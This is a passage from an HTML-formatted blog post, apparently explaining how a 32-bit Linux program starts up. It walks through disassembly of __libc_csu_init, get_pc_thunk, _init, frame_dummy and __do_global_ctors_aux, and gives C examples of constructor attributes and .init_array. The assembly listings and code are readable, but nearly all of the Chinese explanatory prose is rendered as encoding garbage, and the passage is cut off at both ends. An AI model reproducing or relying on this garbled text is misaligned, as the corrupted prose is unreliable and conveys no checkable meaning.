class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">080483f0 &lt;__libc_csu_init&gt;:</span><br><span class="line"> 80483f0:55                   push   ebp</span><br><span class="line"> 80483f1:57                   push   edi</span><br><span class="line"> 80483f2:56                   push   esi</span><br><span class="line"> 80483f3:53                   push   ebx</span><br><span class="line"> 80483f4:e8 17 ff ff ff       call   8048310 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line"> 80483f9:81 c3 07 1c 00 00    add    ebx,0x1c07</span><br><span class="line"> 80483ff:83 ec 0c             sub    esp,0xc</span><br><span class="line"> 8048402:8b 6c 24 20          mov    ebp,DWORD PTR [esp+0x20]</span><br><span class="line"> 8048406:8d b3 0c ff ff ff    lea    esi,[ebx-0xf4]</span><br><span class="line"> 804840c:e8 7b fe ff ff       call   804828c &lt;_init&gt;</span><br><span class="line"> 8048411:8d 83 08 ff ff ff    lea    eax,[ebx-0xf8]</span><br><span class="line"> 8048417:29 c6                sub    esi,eax</span><br><span class="line"> 8048419:c1 fe 02             sar    esi,0x2</span><br><span class="line"> 804841c:85 f6                test   esi,esi</span><br><span class="line"> 804841e:74 25                je     8048445 &lt;__libc_csu_init+0x55&gt;</span><br><span class="line"> 8048420:31 ff                xor    edi,edi</span><br><span class="line"> 8048422:8d b6 00 00 00 00    lea    esi,[esi+0x0]</span><br><span class="line"> 8048428:83 ec 04             sub    esp,0x4</span><br><span class="line"> 804842b:ff 74 24 2c          push   DWORD PTR [esp+0x2c]</span><br><span class="line"> 804842f:ff 74 24 2c          push   DWORD PTR [esp+0x2c]</span><br><span class="line"> 8048433:55                   push   ebp</span><br><span class="line"> 8048434:ff 94 bb 08 ff ff ff call   DWORD PTR [ebx+edi*4-0xf8]</span><br><span class="line"> 804843b:83 c7 01             add    edi,0x1</span><br><span class="line"> 804843e:83 c4 10             add    esp,0x10</span><br><span class="line"> 8048441:39 f7                cmp    edi,esi</span><br><span class="line"> 8048443:75 e3                jne    8048428 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line"> 8048445:83 c4 0c             add    esp,0xc</span><br><span class="line"> 8048448:5b                   pop    ebx</span><br><span class="line"> 8048449:5e                   pop    esi</span><br><span class="line"> 804844a:5f                   pop    edi</span><br><span class="line"> 804844b:5d                   pop    ebp</span><br><span class="line"> 804844c:c3                   ret    </span><br><span class="line"> 804844d:8d 76 00             lea    esi,[esi+0x0]</span><br></pre></td></tr></table></figure><p><strong>What the heck is a thunk?</strong></p><p><code>get_pc_thunk</code>ÊòØÁªô‰ΩçÁΩÆÊó†ÂÖ≥Á†Å‰ΩøÁî®ÁöÑ„ÄÇÈÄöËøáÂÆÉÔºåÊàë‰ª¨ÂèØ‰ª•‰Ωø‰ΩçÁΩÆÊó†ÂÖ≥‰ª£Á†ÅÊ≠£Â∏∏Â∑•‰Ωú„ÄÇ</p><p>‰∏∫‰∫ÜËÆ©‰ªñ‰ª¨Â∑•‰ΩúÔºåÂü∫ÂùÄÂØÑÂ≠òÂô®ÔºàebpÔºâÈúÄË¶ÅÁü•ÈÅì<code>GLOBAL_OFFSET_TABLE</code></p><p>ÂÖ∂‰∏≠‰ª£Á†ÅÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">08048310 &lt;__x86.get_pc_thunk.bx&gt;:</span><br><span class="line"> 8048310:8b 1c 24             mov    ebx,DWORD PTR [esp]</span><br><span class="line"> 8048313:c3                   ret</span><br><span class="line"></span><br><span class="line"> 80483f3:53                   push   ebx</span><br><span class="line"> 80483f4:e8 17 ff ff ff       call   8048310 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line"> 80483f9:81 c3 07 1c 00 00    add    ebx,0x1c07;add  $_GLOBAL_OFFSET_TABLE_,%ebx</span><br></pre></td></tr></table></figure><p>Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ÔºåÂú®Ë∞ÉÁî®<code>__get_pc_thunk_dx</code>ÂêéÔºåÂ∞Ü‰∏ã‰∏ÄÊù°Êåá‰ª§ÂéãÂÖ•‰∫ÜÊ†à‰∏≠„ÄÇ</p><p>Âú®<code>__get_pc_thunk_dx</code>‰∏≠ÔºåÊàë‰ª¨Â∞ÜËøîÂõûÂú∞ÂùÄ‰ªéÊ†à‰∏≠ËµãÂÄºÂà∞ebx‰∏≠Ôºå‰πãÂêéÂèàÂ∞±<code>_GLOBAL_OFFSET_TABLE_</code>Âä†Âà∞<code>ebx</code>‰∏äÂéª„ÄÇ<strong>ÂÖ∂‰∏≠<code>_GLOBAL_OFFSET_TABLE_</code>‰ª£Ë°®‰∫ÜÂΩìÂâçÂú∞ÂùÄÂíå‰ΩçÁΩÆÊó†ÂÖ≥Á†Å‰ΩøÁî®ÁöÑ<code>GOT(global offset table)</code>ÁöÑÂ∑ÆÂÄº„ÄÇ</strong></p><blockquote><p>ËøôÈáåÊúâ-picÂèØ‰ª•ËÆ©ÁºñËæëÂô®Áõ¥Êé•ÁªôÊàë‰ª¨ÂÆåÊàê‰ΩçÁΩÆÊó†ÂÖ≥Ëá™Âä®Âåñ„ÄÇ</p></blockquote><h2 id="0x07-init-gets-the-call"><a href="#0x07-init-gets-the-call" class="headerlink" title="0x07 _init gets the call"></a>0x07 _init gets the call</h2><p>Êàë‰ª¨Êù•ÁêÜ‰∏Ä‰∏ãÊµÅÁ®ãÔºåÈ¶ñÂÖàÂä†ËΩΩÂô®Â∞ÜÊéßÂà∂‰∫§Áªô‰∫Ü<code>_start</code>Ôºå‰πãÂêéË∞ÉÁî®‰∫Ü<code>__libc_start_main</code>ÔºåÁÑ∂ÂêéÂèàË∞ÉÁî®‰∫Ü<code>__libc_csu_init</code>ÔºåÊúÄÂêéË∞ÉÁî®‰∫Ü<code>_init</code></p><p>Êù•Áúã‰∏Ä‰∏ã<code>_init</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">;ËøôÈáåÊàëÂíåÂéüÊñáÁöÑ‰∏çÂ§™‰∏ÄÊ†∑ÔºåÁúãÂéüÊñáÁöÑÊää</span><br><span class="line">;0804828c &lt;_init&gt;:</span><br><span class="line">; 804828c:53                   push   ebx</span><br><span class="line">; 804828d:83 ec 08             sub    esp,0x8</span><br><span class="line">; 8048290:e8 7b 00 00 00       call   8048310 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">; 8048295:81 c3 6b 1d 00 00    add    ebx,0x1d6b</span><br><span class="line">; 804829b:8b 83 fc ff ff ff    mov    eax,DWORD PTR [ebx-0x4]</span><br><span class="line">; 80482a1:85 c0                test   eax,eax</span><br><span class="line">; 80482a3:74 05                je     80482aa &lt;_init+0x1e&gt;</span><br><span class="line">; 80482a5:e8 26 00 00 00       call   80482d0 &lt;__libc_start_main@plt+0x10&gt;</span><br><span class="line">; 80482aa:83 c4 08             add    esp,0x8</span><br><span class="line">; 80482ad:5b                   pop    ebx</span><br><span class="line">; 80482ae:c3                   ret</span><br><span class="line">08048274 &lt;_init&gt;:</span><br><span class="line"> 8048274:       55                      push   %ebp</span><br><span class="line"> 8048275:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 8048277:       53                      push   %ebx</span><br><span class="line"> 8048278:       83 ec 04                sub    $0x4,%esp</span><br><span class="line"> 804827b:       e8 00 00 00 00          call   8048280 &lt;_init+0xc&gt;</span><br><span class="line"> 8048280:       5b                      pop    %ebx</span><br><span class="line"> 8048281:       81 c3 74 1d 00 00       add    $0x1d74,%ebx        (.got.plt)</span><br><span class="line"> 8048287:       8b 93 fc ff ff ff       mov    -0x4(%ebx),%edx</span><br><span class="line"> 804828d:       85 d2                   test   %edx,%edx</span><br><span class="line"> 804828f:       74 05                   je     8048296 &lt;_init+0x22&gt;</span><br><span class="line"> 8048291:       e8 1e 00 00 00          call   80482b4 &lt;__gmon_start__@plt&gt;</span><br><span class="line"> 8048296:       e8 d5 00 00 00          call   8048370 &lt;frame_dummy&gt;</span><br><span class="line"> 804829b:       e8 70 01 00 00          call   8048410 &lt;__do_global_ctors_aux&gt;</span><br><span class="line"> 80482a0:       58                      pop    %eax</span><br><span class="line"> 80482a1:       5b                      pop    %ebx</span><br><span class="line"> 80482a2:       c9                      leave</span><br><span class="line"> 80482a3:       c3                      ret</span><br></pre></td></tr></table></figure><h3 id="1-It-starts-with-the-regular-C-calling-convention"><a href="#1-It-starts-with-the-regular-C-calling-convention" class="headerlink" title="1. It starts with the regular C calling convention"></a>1. It starts with the regular C calling convention</h3><p>ÂíåÂ∏∏ËßÑcÂáΩÊï∞Ë∞ÉÁî®‰∏ÄÊ†∑ÔºåÂéãÊ†àÔºåË∞ÉebpÔºå‰πãÂêéÂ∞±ÊòØÂíåÊàë‰ª¨‰∏äÈù¢ÁúãËßÅÁöÑ‰∏ÄÊ†∑„ÄÇ</p><p>call‰∏ã‰∏ÄÊù°Êåá‰ª§Ôºå‰ΩÜÂêåÊó∂‰πüÊää‰∏ã‰∏ÄÊù°Êåá‰ª§ÂéãÂÖ•‰∫ÜÊ†à‰∏≠„ÄÇËøô‰πàÂÅöÂ•ΩÂÉèÂíåÊàë‰ª¨È°∫Â∫èÊâßË°åÊòØ‰∏ÄÊ†∑ÁöÑÔºå‰ΩÜÁî±‰∫é‰∏ã‰∏ÄÊù°Êåá‰ª§ÁöÑÂú∞ÂùÄÂ≠òÂà∞‰∫Üebx‰∏≠„ÄÇ</p><p>‰πãÂêéÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáebxÊù•ËÆøÈóÆÂÖ®Â±ÄËÆøÈóÆË°®‰∫Ü„ÄÇ</p><h3 id="2-what-is-gmon-start"><a href="#2-what-is-gmon-start" class="headerlink" title="2. what is __gmon__start?"></a>2. what is __gmon__start?</h3><p>Â¶ÇÊûú<code>__gmon_start</code>ÊòØÁ©∫ÁöÑÔºåÊàë‰ª¨Â∞ÜË∑≥ËøáÂÆÉÔºåÂê¶ÂàôÂ∞±Áî®ÂÆÉÊù•ËÆæÁΩÆprofiling„ÄÇ</p><p>ËØ•ÂáΩÊï∞Ë∞ÉÁî®ÂºÄÂßãprofilingÔºåÂπ∂‰∏îË∞ÉÁî®<code>at_exit</code>ÂéªË∞ÉÁî®Âè¶‰∏Ä‰∏™Á®ãÂ∫èËøêË°åÔºåÂπ∂‰∏îÂú®ËøêË°åÁªìÊùüÁöÑÊó∂ÂÄôÁîüÊàêgmon.out</p><h3 id="3-what-is-frame-dummy"><a href="#3-what-is-frame-dummy" class="headerlink" title="3. what is frame_dummy?"></a>3. what is frame_dummy?</h3><p>Êé•‰∏ãÊù•Êàë‰ª¨Â∞ÜË∞ÉÁî®<code>frame_dummy</code>„ÄÇËøôÊ†∑ÂÅö‰∏ªË¶ÅÊòØ‰∏∫‰∫ÜË∞ÉÁî®<code>__register_fram_info</code>Ôºå‰ΩÜÊòØËøô‰∏™Ë¢´Ë∞ÉÁî®‰∏ªË¶ÅÊòØ‰∏∫‰∫ÜËÆæÁΩÆÂèÇÊï∞„ÄÇ</p><p>ËøôÊ†∑ËÆæÁΩÆÁöÑÁõÆÁöÑ‰∏ªË¶ÅÊòØ‰∏∫‰∫ÜÂú®Âá∫ÈîôÊó∂ËÆæÁΩÆunwinding stack frames„ÄÇ</p><h3 id="4-what-is-do-global-ctors-aux"><a href="#4-what-is-do-global-ctors-aux" class="headerlink" title="4. what is__do_global_ctors_aux?"></a>4. what is__do_global_ctors_aux?</h3><p>Êàë‰ª¨Áªà‰∫éÁúãÂà∞‰∫Ü__do_global_ctors_auxÂáΩÊï∞„ÄÇÂ¶ÇÊûúÂú®mainÂáΩÊï∞ÂºÄÂßãÂâçÂ∞±ÂèëÁîü‰∫ÜÈîôËØØÔºåÊàë‰ª¨Â∞±ÂæóÁúãËøô‰∏™ÂáΩÊï∞‰∫Ü„ÄÇ</p><p>ÂΩìÁÑ∂ÔºåËøôÈáåÈù¢ÊúâÂÖ®Â±ÄC++ÂØπË±°ÁöÑÊûÑÈÄ†ÂáΩÊï∞„ÄÇ</p><p><strong>‰∏æ‰∏™‰æãÂ≠ê</strong></p><p>ÂÜô‰∏™prog„ÄÇ<code>__attribute__((constructor))</code>ÂëäËØâgccÔºåÈìæÊé•Âô®Â∫îËØ•Âú®<code>__do_global_ctors_aux</code>‰ΩøÁî®ÁöÑË°®ÈáåÂàõÂª∫‰∏Ä‰∏™ÊåáÈíàÊåáÂêëËøôÈáå„ÄÇ</p><blockquote><p><code>__attribute__((constructor))</code>Â∞±ÊòØÂÖàÂú®‰∏ªÂáΩÊï∞ÊâßË°åÂâçÔºåÊâßË°åÊûÑÈÄ†ÂáΩÊï∞„ÄÇ</p><p><code>__FUNCTION__</code>ÊòØÂáΩÊï∞ÁöÑÂêçÂ≠ó„ÄÇ</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//prog.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((constructor)) a_constructor() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,__FUNCTION__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊâßË°åÁªìÊûúÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;Desktop&#x2F;main                                                                 </span><br><span class="line">‚ñ∂ .&#x2F;prog</span><br><span class="line">a_constructor</span><br><span class="line">main</span><br></pre></td></tr></table></figure><p>ÂèçÊ±áÁºñ‰∏Ä‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">08048290 &lt;_init&gt;:</span><br><span class="line"> 8048290:       55                      push   %ebp</span><br><span class="line"> 8048291:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 8048293:       53                      push   %ebx</span><br><span class="line"> 8048294:       83 ec 04                sub    $0x4,%esp</span><br><span class="line"> 8048297:       e8 00 00 00 00          call   804829c &lt;_init+0xc&gt;</span><br><span class="line"> 804829c:       5b                      pop    %ebx</span><br><span class="line"> 804829d:       81 c3 58 1d 00 00       add    $0x1d58,%ebx</span><br><span class="line"> 80482a3:       8b 93 fc ff ff ff       mov    -0x4(%ebx),%edx</span><br><span class="line"> 80482a9:       85 d2                   test   %edx,%edx</span><br><span class="line"> 80482ab:       74 05                   je     80482b2 &lt;_init+0x22&gt;</span><br><span class="line"> 80482ad:       e8 1e 00 00 00          call   80482d0 &lt;__gmon_start__@plt&gt;</span><br><span class="line"> 80482b2:       e8 d9 00 00 00          call   8048390 &lt;frame_dummy&gt;</span><br><span class="line"> 80482b7:       e8 94 01 00 00          call   8048450 &lt;__do_global_ctors_aux&gt;</span><br><span class="line"> 80482bc:       58                      pop    %eax</span><br><span class="line"> 80482bd:       5b                      pop    %ebx</span><br><span class="line"> 80482be:       c9                      leave</span><br><span class="line"> 80482bf:       c3                      ret</span><br></pre></td></tr></table></figure><p><strong>ÂáΩÊï∞Ë∞ÉÁî®ÁöÑÊ∫ê‰ª£Á†Å</strong></p><p>ÂÆÉ‰Ωç‰∫éGCCÊ∫êÁ†Å‰∏≠ÁöÑgcc/crtstuff.cÈáå</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__do_global_ctors_aux (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  func_ptr *p;</span><br><span class="line">  <span class="keyword">for</span> (p = __CTOR_END__ - <span class="number">1</span>; *p != (func_ptr) <span class="number">-1</span>; p--)</span><br><span class="line">    (*p) ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂàÜÊûê‰∏Ä‰∏ãËøô‰∏™ÂáΩÊï∞</p><p>ÂÖàÂàùÂßãÂåñ‰∫Ü‰∏Ä‰∏™ÊåáÈíàÔºåpÁöÑÂÄºË¢´ÂàùÂßãÂåñÊàê<code>__CTOR_END__</code>-1„ÄÇ‰πüÂ∞±ÊòØÊåáÈíàÂêë‰∏äÁßªÂä®‰∏Ä‰∏™ÊåáÈíàÊàñ4‰∏™Â≠óËäÇ„ÄÇ</p><p>Áõ¥Âà∞ÊåáÈíàÁöÑÂÄº‰∏çÁ≠â‰∫é-1ÔºåÂê¶ÂàôÂ∞±ÊØèÊ¨°Ë∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞ÔºåÂπ∂‰ΩøÊåáÈíà‰∏äÁßª„ÄÇ</p><p>ÂæàÊòéÊòæÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ÊåáÈíàÊï∞ÁªÑÈáåÈù¢Ëµ∑ÂßãÂ∫îËØ•ÊòØ[-1,xxx,xxx,xxx,‚Ä¶]xxx‰∏∫ÂáΩÊï∞ÊåáÈíà</p><p><strong>Ê±áÁºñ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">08048450 &lt;__do_global_ctors_aux&gt;:</span><br><span class="line"> 8048450:       55                      push   %ebp</span><br><span class="line"> 8048451:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 8048453:       53                      push   %ebx</span><br><span class="line"> 8048454:       83 ec 04                sub    $0x4,%esp</span><br><span class="line"> 8048457:       a1 14 9f 04 08          mov    0x8049f14,%eax</span><br><span class="line"> 804845c:       83 f8 ff                cmp    $0xffffffff,%eax</span><br><span class="line"> 804845f:       74 13                   je     8048474 &lt;__do_global_ctors_aux+0x24&gt;</span><br><span class="line"> 8048461:       bb 14 9f 04 08          mov    $0x8049f14,%ebx</span><br><span class="line"> 8048466:       66 90                   xchg   %ax,%ax</span><br><span class="line"> 8048468:       83 eb 04                sub    $0x4,%ebx</span><br><span class="line"> 804846b:       ff d0                   call   *%eax</span><br><span class="line"> 804846d:       8b 03                   mov    (%ebx),%eax</span><br><span class="line"> 804846f:       83 f8 ff                cmp    $0xffffffff,%eax</span><br><span class="line"> 8048472:       75 f4                   jne    8048468 &lt;__do_global_ctors_aux+0x18&gt;</span><br><span class="line"> 8048474:       83 c4 04                add    $0x4,%esp</span><br><span class="line"> 8048477:       5b                      pop    %ebx</span><br><span class="line"> 8048478:       5d                      pop    %ebp</span><br><span class="line"> 8048479:       c3                      ret</span><br></pre></td></tr></table></figure><p>ÂàÜÊûê‰∏Ä‰∏ã</p><ol><li>ÂÖàÂàùÂßãÂåñÊ†àÔºåÁÑ∂ÂêéÂéãÂÖ•ebx„ÄÇËôΩÁÑ∂Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞Âú®Ê†à‰∏äÂºÄËæü‰∫ÜÂèòÈáèÁ©∫Èó¥Ôºå‰ΩÜÊàë‰ª¨Âπ∂Êú™‰ΩøÁî®ËøáÂÆÉ„ÄÇÊàë‰ª¨Â∞Üp‰øùÂ≠òÂà∞‰∫Üebx‰∏≠Ôºå*p‰øùÂ≠òÂà∞‰∫Üeax‰∏≠„ÄÇ</li><li>‰πãÂêéÊåâÁÖßÊàë‰ª¨ÁêÜËß£Â∞±ÊòØÁªôpËµãÂÄºÔºå‰ΩÜËøôÈáåÁºñËØëÂô®ÂÅö‰∫Ü‰∏Ä‰∫õ‰ºòÂåñ„ÄÇÁºñËØëÂô®Áõ¥Êé•Â∞Ü<em>(__CTOR_END__-1)ËµãÂÄºÁªô‰∫Üeax,‰πüÂ∞±ÊòØ0x8049f14„ÄÇ<em>*ËøôÈáåËøòË¶ÅÊ≥®ÊÑè‰∏Ä‰∏ã$ÂêéÈù¢Ë∑üÊï∞Â≠óÊâçÊòØÁ´ãÂç≥Êï∞ÔºåËÄå‰∏çÂ∏¶$ÔºåÁõ¥Êé•ÂÜôÊï∞Â≠óÊÑèÊÄùÊòØËøô‰∏™Âú∞ÂùÄÊåáÂêëÁöÑÂÜÖÂÆπ</em></em>„ÄÇ</li><li>‰∏äÈù¢ÈÇ£ÊÆµËØùÂÖ∂ÂÆûÂ∞±ÊòØÈó¥Êé•ÂØªÂùÄ„ÄÇÂ∞±ÊòØÂ∞ÜÈÇ£‰∏™Âú∞ÂùÄÈáåÈù¢ÁöÑÂÜÖÂÆπÊîæÂÖ•eax‰∏≠ÔºåÁÑ∂ÂêéÂíå-ÊØîËæÉÔºåÁõ∏Á≠âÂ∞±Ë∑≥ËΩ¨ÔºåÂê¶ÂàôËøõÂÖ•Âæ™ÁéØ„ÄÇ</li><li>Êé•‰∏ãÊù•ÔºåÊàë‰ª¨Â∞ÜÁ´ãÂç≥Êï∞0x8049f14ÊîæÂÖ•‰∫Üebx‰∏≠ÔºåÁÑ∂ÂêéÊâßË°å‰∫Ü<code>xchg   %ax,%ax</code>ÔºåËøôÂè•ËØùÂ∞±ÊòØ‰∏Ä‰∏™Á©∫Êåá‰ª§ÔºåÁõ∏ÂΩì‰∫éÊòØNOP„ÄÇÂ•ΩÂ§ÑÔºöÂú®ËøôÁßçÊÉÖÂÜµ‰∏ãÔºå‰ΩøÂæ™ÁéØÂºÄÂßã‰∫é<code>8048468</code>ÔºåËÄå‰∏çÊòØ<code>8048466</code>„ÄÇËøô‰πàÂÅöÁöÑÂ•ΩÂ§ÑÊòØ‰ΩøÂæ™ÁéØÂºÄÂßãÁöÑÂú∞Êñπ‰ª•4Â≠óËäÇÂØπÈΩêÔºåËøôÊ†∑Êï¥‰∏™Âæ™ÁéØÂ∞Ü‰ºöÊûÅÂ§ßÂèØËÉΩÁöÑË¢´‰øùÂ≠òÂà∞‰∏Ä‰∏™cache lineÈáåÔºåËÄå‰∏ç‰ºöË¢´ÂàÜÊàê‰∏§ÊÆµÔºå‰ªéËÄåËµ∑Âà∞Âä†ÈÄüÊâßË°åÁöÑ‰ΩúÁî®„ÄÇ</li><li>ÁÑ∂ÂêéÂ∞±ÊòØËøõË°åÂæ™ÁéØ‰∫ÜÔºåebxÂáè4ÔºåË∞ÉÁî®eaxÈáå‰øùÂ≠òÁöÑÂú∞ÂùÄÁöÑÂáΩÊï∞ÔºåÁÑ∂ÂêéÂíå-1ËøõË°åÊØîËæÉÔºåÁªßÁª≠Âæ™ÁéØ„ÄÇ</li><li>ÊúÄÂêéÂ∞±ÊòØÊâßË°åÂÆåÊØïÔºåËøîÂõû<code>_init</code>ÔºåÊúÄÂêéËøîÂõûÂà∞<code>__libc_csu_init</code>‰∏≠</li></ol><h2 id="0x08-Back-up-to-libc-csu-init"><a href="#0x08-Back-up-to-libc-csu-init" class="headerlink" title="0x08 Back up to __libc_csu_init__"></a>0x08 Back up to <strong>__libc_csu_init__</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_csu_init (<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  _init ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> <span class="built_in">size</span> = __init_array_end - __init_array_start;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">size</span>; i++)</span><br><span class="line">      (*__init_array_start [i]) (argc, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂàöÂàöÊàë‰ª¨Â∑≤ÁªèÁúãÂà∞‰∫Ü__initÈáåÈù¢ÁöÑÂÜÖÂÆπÔºå‰ΩÜ‰∏ãÈù¢Ëøô‰∏™Êï∞ÁªÑÊòØÂπ≤‰ªÄ‰πàÁöÑÂë¢Ôºü</p><p>ËøôÈáåÂÄüÁî®Âà´‰∫∫ÁøªËØëÁöÑÔºö</p><p>ËøôÊó∂ÂàöÂàö‰ªéËøêË°åÊàë‰ª¨Ëá™ÂÆö‰πâÁöÑÊûÑÈÄ†ÂáΩÊï∞ÁöÑ<code>_init</code>ÂáΩÊï∞ËøîÂõûÔºåËøôÊÑèÂë≥ÁùÄÔºåÂú®Ëøô‰∏™Êï∞ÁªÑÈáåÈù¢ÁöÑÂÜÖÂÆπÂ∞Ü‰ºöÂú®ÊûÑÈÄ†ÂáΩÊï∞ÂÆåÊàê‰πãÂêéËøêË°å„ÄÇ‰Ω†ËÉΩÈÄöËøáÊüêÁßçÊñπÂºèÂëäËØâÁºñËØëÂô®‰Ω†ÊÉ≥Âú®Ëøô‰∏™Èò∂ÊÆµËøêË°åÊüê‰∏™‰Ω†Ëá™ÂÆö‰πâÁöÑÂáΩÊï∞„ÄÇËøô‰∏™ÂáΩÊï∞‰πü‰ºöÊî∂Âà∞ÂíåmainÂáΩÊï∞Áõ∏ÂêåÁöÑÂèÇÊï∞„ÄÇ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((section(<span class="string">".init_array"</span>))) typeof(init) *__init = init;</span><br></pre></td></tr></table></figure><h2 id="0x09-At-the-end"><a href="#0x09-At-the-end" class="headerlink" title="0x09 At the end"></a>0x09 At the 